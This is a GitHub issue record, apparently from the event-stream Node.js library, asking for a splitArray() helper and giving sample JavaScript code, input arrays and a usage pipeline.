104,open,2017-05-28T02:31:21Z,2018-09-05T04:35:51Z,null,0,Vanuan,361985,NONE,0,Feature request: splitArray,It's kind of tricky to find out how to use "through". It would be easier if there was a dedicated splitArray() function:<\r><\n><\r><\n><\r><\n>```<\r><\n>function splitArray() {<\r><\n> return es.through(function emitArray(array) {<\r><\n> array.forEach(function(item) {<\r><\n> this.emit('data'<c> item);<\r><\n> }.bind(this));<\r><\n> }<c> function end() {<\r><\n> this.emit('end');<\r><\n> })<\r><\n>}<\r><\n><\r><\n>// input example:<\r><\n><\r><\n>[{value1: 1}<c>{value2: 2}<c>{value3: 3}]<\r><\n>[{value4: 4}<c>{value5: 5}<c>{value6: 6}]<\r><\n>[{value7: 7}<c>{value8: 8}<c>{value9: 9}]<\r><\n><\r><\n>// usage:<\r><\n><\r><\n>inputStream<\r><\n> .pipe(es.split())<\r><\n> .pipe(es.map((line<c> callback) => { line ? callback(null<c> line) : callback() }))<\r><\n> .pipe(es.parse())<\r><\n> .pipe(es.splitArray())<\r><\n> .pipe(es.map(function (data<c> cb) {<\r><\n> cb(null<\r><\n> <c> inspect(JSON.parse(data)))<\r><\n> }))<\r><\n> .pipe(process.stdout);<\r><\n><\r><\n>```<\n>
